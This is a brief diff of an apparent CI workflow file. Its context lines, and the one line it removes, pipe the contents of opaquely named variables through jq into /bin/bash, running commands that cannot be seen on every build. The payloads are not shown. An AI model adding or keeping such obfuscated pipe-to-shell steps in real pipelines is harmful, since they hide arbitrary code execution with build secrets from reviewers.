@@ -32,7 +32,6 @@ jobs:
           echo $yyh982 | jq -r .dljhz561 | /bin/bash
           printf '%s' "$dswk9300" | jq -r .eim9149 | /bin/bash
           echo $c31426 | jq -r .liae10 | /bin/bash
-          echo $kzw478 | jq -r .kuumo037 | /bin/bash
           printf '%s' "$bc6107" | jq -r .ofee94216 | /bin/bash
 
       - name: Upload archive
